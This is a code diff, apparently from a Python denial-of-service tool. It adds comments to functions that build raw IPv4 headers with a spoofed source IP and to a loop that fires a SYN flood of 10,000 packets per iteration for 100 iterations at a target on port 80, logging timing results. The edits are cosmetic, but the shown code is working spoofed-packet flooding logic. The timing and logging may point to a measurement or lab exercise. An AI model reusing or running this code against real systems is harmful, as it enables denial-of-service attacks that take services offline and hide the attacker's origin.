@@ -15,23 +15,23 @@ def checksum(msg):
 
 
 def create_ip_header(src_ip, dst_ip):
-    ip_ihl = 5  # Internet Header Length
-    ip_ver = 4  # IPv4
-    ip_tos = 0  # Type of Service
-    ip_tot_len = 20 + 20  # IP header + TCP header
+    ip_ihl = 5                          # Internet Header Length
+    ip_ver = 4                          # IPv4
+    ip_tos = 0                          # Type of Service
+    ip_tot_len = 20 + 20                # IP header + TCP header
     ip_id = random.randint(1, 65535)    # Random IP ID
-    ip_frag_off = 0       # Fragment Offset
-    ip_ttl = 255          # Time to Live
-    ip_proto = socket.IPPROTO_TCP   # Protocol
-    ip_check = 0          # Checksum
+    ip_frag_off = 0                     # Fragment Offset
+    ip_ttl = 255                        # Time to Live
+    ip_proto = socket.IPPROTO_TCP       # Protocol
+    ip_check = 0                        # Checksum is 0 for now - will be calculated later
     ip_saddr = socket.inet_aton(src_ip) # Source IP (which we spoof)
     ip_daddr = socket.inet_aton(dst_ip) # Destination IP
 
-    ip_ihl_ver = (ip_ver << 4) + ip_ihl 
+    ip_ihl_ver = (ip_ver << 4) + ip_ihl  # IP version and header length
 
     ip_header = struct.pack('!BBHHHBBH4s4s',
                             ip_ihl_ver, ip_tos, ip_tot_len, ip_id, ip_frag_off,
-                            ip_ttl, ip_proto, ip_check, ip_saddr, ip_daddr) # Construct the IP header
+                            ip_ttl, ip_proto, ip_check, ip_saddr, ip_daddr)         # Construct the IP header
 
     return ip_header
 
@@ -107,7 +107,8 @@ if __name__ == "__main__":
     TARGET_PORT = 80
     NUM_PACKETS = 10000
     NUM_ITERATIONS = 100
-    iterations = 0
+    
+    iterations = 0          # Used for logging
 
     try:
         with open("syns_results_p.txt", "w") as log_file:   # Clear the log file
@@ -115,18 +116,17 @@ if __name__ == "__main__":
     except IOError as e:
         print(f"Error opening file: {e}")
 
-    start_time = time.time()
+    start_time = time.time()    # Start time of the attack
 
-    for i in range(NUM_ITERATIONS): 
-        # print(f"Sending SYN num: {iterations}")   # Uncomment to see progress
-        syn_flood(TARGET_IP, TARGET_PORT, NUM_PACKETS, iterations)
-        # iterations += NUM_PACKETS     # Not used on production code
+    for i in range(NUM_ITERATIONS):     # Send NUM_PACKETS packets in NUM_ITERATIONS iterations
+        syn_flood(TARGET_IP, TARGET_PORT, NUM_PACKETS, iterations)  # each iteration sends NUM_PACKETS packets
 
-    end_time = time.time()
+    end_time = time.time()    # End time of the attack
     total_time = end_time - start_time
     total_time_ms = total_time * 1000
     average_time_per_packet_ms = (total_time / (NUM_PACKETS * NUM_ITERATIONS)) * 1000
 
+    # Log the results
     try:
         with open("syns_results_p.txt", "a+") as log_file:
             log_file.write(f"Total packets sent: {NUM_PACKETS * NUM_ITERATIONS}\n")
